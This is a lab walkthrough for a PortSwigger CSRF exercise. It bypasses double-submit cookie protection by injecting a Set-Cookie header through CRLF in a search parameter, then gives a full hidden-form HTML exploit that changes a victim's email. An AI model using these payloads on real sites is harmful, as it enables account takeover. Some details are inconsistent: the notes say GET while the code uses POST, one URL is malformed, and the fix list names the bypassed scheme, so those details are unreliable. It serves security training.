**Quick Brief:**
- CSRF exploits the browser's automatic credential sending mechanism combined with the application's trust in authenticated requests without verification of user intent
- The vulnerability exists because web applications cannot distinguish between:
      1. A legitimate request initiated by the user through the application's UI
      2. A forged request initiated by an attacker from another site


**What we're testing:** The `/my-account/change-email` endpoint for CSRF protection
**Why it might be vulnerable:** No CSRF token, SameSite cookies, or other anti-CSRF measures
**What CSRF exploits:** Browser automatically sends session cookies with requests


**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
## Steps:
1. Open your lab and log in with given credentials wiener:peter
2. Open Burp Suite we know from the lab describtion the endpoint of the email is vulnerable to csrf
3. Change your email and send the request to repeater
4. Observe from the request there is CSRF token and a csrf key cookie at first i tried to add a number to the csrf token to see if the server validates it and error accured 
5. Now i tried to delete the whole token  and the csrf cookie and also an error accured
6. Notice the csrf key value and the csrf cookie value are both equal this leads me to belive this site is using double submit cookie
7. Both the csrf key and the csrf cookie should be equal change both values to test124 send the request notice you got 302 found this is a good singn
8. Now we need to find a place to injetc our csrf key because it is a cookie we need to inject it 
9. Go to the main page and from cookie editor extension notice we have 2 cookies only now search for something for example test and notice there is another cookie added
    called LastTermSearch this is a new cookie added maybe we can inject our cookie in it
10. Search for something and send the request to repeater now to inejtc a cookie %0d%0aSet-Cookie:%20csrf=test123%3b%20SameSite=None and send notice your new cookie in the reponse is added
11. Now we will prepare our malicious code

12.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>Hello world</h1>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form action="https://0a1a00b604247d528075031a004200da.web-security-academy.net/my-account/change-email" method="post" target="csrf-iframe" id="csrf-form">
    <input type="hidden" name="email" value="test@test.ca">
    <input type="hidden" name="csrf" value="test123">
    </form>
    <img style="display:none;" src="https:/0a1a00b604247d528075031a004200da.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test123%3b%20SameSite=None" onerror="document.forms[0].submit()">
</body>
</html>
```


13. Copy the code and change the lab link to your lab link and paste it in the body of the exploit server and then store the exploit then Deliver exploit to victim
14. Lab solved

## Notes:
- This code is like a normal html page that change the users email automatically without even them knowing by just making the user click on the link
- The  `<form> </form>` is to create a form in html :
`action` here we put our lab link id and the functionality `/my-account/change-email` you want to excute
`method:get` we know from the request that it doesnot validate tokens on get 

- The `<input>` is to create an input for the email in the html form:
`type:hidden` so the no input field appear to the user
`name:email` we got it from the rquest
`value` is the new email you want to change to

- The `<iframe></iframe>` is a sand box so the form is excuted inside it :
`style="display: none;` so nothing appear to the user

The `<img` is a link to an image `display:none` so when error accure nothig appear to the user:
It starts with %0d%0a which are URL-encoded carriage return and line feed (\r\n)
%3b = ; (semicolon)
%20 = (space)
So %3b%20 becomes ; (semicolon followed by a space).

Exaplanation:
Browser's Automatic Behavior:

   1.IMG tag loads → Browser makes request to search URL

   2. Server responds with Set-Cookie header

   3.Browser stores cookie (no user interaction needed)

   4.Form submits → Browser sends stored cookie automatically



## How to Fix (For Developers)
1. **CSRF Tokens**: Validate tokens on both request methods or allow only post requests
2. **SameSite Cookies**: `SameSite=Strict` for sensitive actions
3. **Custom Headers**: Require `X-Requested-With: XMLHttpRequest`
4. **Double Submit**: Token in both cookie and request



